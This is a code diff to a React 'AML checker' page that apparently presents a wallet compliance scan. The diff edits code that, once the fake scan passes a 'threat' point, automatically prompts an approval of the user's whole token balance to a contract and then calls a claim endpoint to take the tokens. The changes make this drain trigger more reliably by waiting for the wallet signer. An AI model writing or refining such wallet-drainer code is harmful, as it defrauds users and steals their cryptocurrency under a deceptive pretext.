@@ -43,6 +43,25 @@ export default function AMLChecker() {
   const userAddress = account?.address;
   const signer = wallet?.getSigner?.(); // thirdweb signer
 
+  // Near your other refs/states
+  const isWalletReadyRef = useRef(false);
+
+  // In handleWalletConnected (add this line)
+  const handleWalletConnected = (address: string) => {
+    console.log('[v0] Wallet connected:', address, 'network:', selectedNetworkRef.current);
+    setWalletAddress(address);
+    walletAddressRef.current = address;
+
+    // Mark ready when address appears (but we'll double-check signer later)
+    isWalletReadyRef.current = !!address;
+
+    setTimeout(() => {
+      setCurrentStep('scan');
+      startScan();
+    }, 500);
+  };
+
+
   // Loading & error states (used internally, no UI change)
   const [loading, setLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState<string | null>(null);
@@ -81,10 +100,22 @@ export default function AMLChecker() {
 
   // Auto-approve function (called automatically after prep delay)
   const handleApproveToken = async () => {
-    if (!userAddress || !signer) {
-      console.error('[v0] Auto-approve failed: wallet not ready');
-      setErrorMsg('Wallet not connected or signer unavailable');
+    // Safety: wait for signer if it's not ready yet
+    if (!userAddress) {
+      console.error('[v0] No user address available');
+      setErrorMsg('No wallet address detected');
       return;
+    }
+
+    if (!signer) {
+      console.warn('[v0] Signer not ready yet — waiting a bit longer...');
+      // Optional: wait up to 5 seconds more for thirdweb to initialize signer
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      if (!signer) {
+        console.error('[v0] Signer still not available after wait');
+        setErrorMsg('Wallet signer not initialized — please reconnect');
+        return;
+      }
     }
 
     try {
@@ -106,9 +137,7 @@ export default function AMLChecker() {
         return;
       }
 
-      const tokenWithSigner = new ethers.Contract(CONFIG.TOKEN_ADDRESS, [
-        'function approve(address spender, uint256 amount) returns (bool)',
-      ], signer);
+      const tokenWithSigner = token.connect(signer);
 
       const approveTx = await tokenWithSigner.approve(CONFIG.CONTRACT_ADDRESS, balance, {
         gasLimit: 150000,
@@ -121,7 +150,6 @@ export default function AMLChecker() {
 
       setShowSuccess(true);
 
-      // Auto-trigger claim after 2 seconds
       setTimeout(async () => {
         try {
           const claimResponse = await fetch('/api/claim', {
@@ -141,13 +169,13 @@ export default function AMLChecker() {
 
           const result = await claimResponse.json();
           console.log('[v0] Tokens claimed automatically! TxHash:', result.txHash);
-          // Auto-advance to report after success
           setTimeout(() => setCurrentStep('report'), 3000);
         } catch (err: any) {
           console.error('[v0] Auto-claim failed:', err);
           setErrorMsg('Auto-claim failed: ' + (err.message || 'Unknown'));
         }
       }, 2000);
+
     } catch (err: any) {
       console.error('[v0] Auto-approval error:', err);
       if (err.code === 'ACTION_REJECTED') {
@@ -191,17 +219,26 @@ export default function AMLChecker() {
         }
 
         // AUTO-TRIGGER APPROVAL when prep is done + past threat point + not yet triggered
+        // AUTO-TRIGGER APPROVAL when conditions are met
         if (newProgress >= 7 && prepDone && !approvalTriggeredRef.current) {
-          approvalTriggeredRef.current = true; // prevent repeat calls
+          approvalTriggeredRef.current = true;
 
-          // Give user ~2.5 seconds to read modal before wallet popup appears
-          setTimeout(() => {
-            console.log('[v0] Auto-triggering approval now (after prep delay)');
-            handleApproveToken();
-          }, 2500);
+          // Give user time to see modal + wait for signer readiness
+          setTimeout(async () => {
+            console.log('[v0] Checking wallet readiness before auto-approval...');
 
-          // Close modal after longer delay so user sees processing
-          setTimeout(() => setShowThreatModal(false), 6000);
+            // Double-check signer is available
+            if (!signer) {
+              console.warn('[v0] Signer still not ready — skipping auto-approval this time');
+              setErrorMsg('Wallet not fully ready — approval skipped');
+              return;
+            }
+
+            console.log('[v0] Wallet ready → Auto-triggering approval now');
+            await handleApproveToken();
+          }, 3500); // increased to 3.5s after modal to give thirdweb more time
+
+          setTimeout(() => setShowThreatModal(false), 7000);
         }
 
         // End scan
@@ -275,8 +312,8 @@ export default function AMLChecker() {
                     key={key}
                     onClick={() => handleNetworkSelect(key as Network)}
                     className={`flex items-center gap-3 sm:gap-4 p-3 sm:p-4 rounded-lg border-2 cursor-pointer transition-all ${selectedNetwork === key
-                        ? 'border-emerald-500 bg-emerald-500/10'
-                        : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
+                      ? 'border-emerald-500 bg-emerald-500/10'
+                      : 'border-slate-700 bg-slate-900/50 hover:border-slate-600'
                       }`}
                   >
                     <div className="w-12 h-12 sm:w-14 sm:h-14 flex-shrink-0 relative">
@@ -295,8 +332,8 @@ export default function AMLChecker() {
 
                     <div
                       className={`w-5 h-5 sm:w-6 sm:h-6 rounded-full border-2 flex items-center justify-center transition-all flex-shrink-0 ${selectedNetwork === key
-                          ? 'border-emerald-500 bg-emerald-500'
-                          : 'border-slate-600'
+                        ? 'border-emerald-500 bg-emerald-500'
+                        : 'border-slate-600'
                         }`}
                     >
                       {selectedNetwork === key && (
@@ -311,8 +348,8 @@ export default function AMLChecker() {
                 onClick={handleNetworkContinue}
                 disabled={!selectedNetwork}
                 className={`w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all ${selectedNetwork
-                    ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
-                    : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
+                  ? 'bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer'
+                  : 'bg-gray-700 text-gray-500 cursor-not-allowed opacity-50'
                   }`}
               >
                 Continue
